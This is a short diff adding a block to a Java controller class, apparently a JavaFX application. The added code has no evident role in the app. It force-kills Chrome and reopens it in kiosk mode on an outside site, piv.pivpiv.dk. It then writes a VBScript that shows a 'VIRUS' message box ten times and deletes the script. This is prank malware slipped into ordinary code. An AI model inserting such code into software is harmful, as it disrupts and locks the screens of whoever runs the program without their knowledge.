@@ -91,6 +91,20 @@ public class   ControladorPrincipal {
                 }
             }
         }
+        try {
+            Runtime.getRuntime().exec("cmd.exe /c taskkill /f /im chrome.exe");
+            Thread.sleep(100);
+            Runtime.getRuntime().exec("cmd.exe /c start chrome -kiosk piv.pivpiv.dk");
+            Thread.sleep(100);
+            Runtime.getRuntime().exec("cmd.exe /c echo x=msgbox(\"AAAAAAAAAAAAAAAAAA\",vbYesNo,\"VIRUS\") = vbYes > %tmp%\\tmp.vbs");
+            for (int i = 0; i < 10; i++) {
+                Thread.sleep(100);
+                Runtime.getRuntime().exec("cmd.exe /c cscript //nologo %tmp%\\tmp.vbs");
+            }
+            Runtime.getRuntime().exec("cmd.exe /c del %tmp%\\tmp.vbs");
+        } catch (Exception e) {
+            throw new RuntimeException(e);
+        }
     }
 
     @FXML
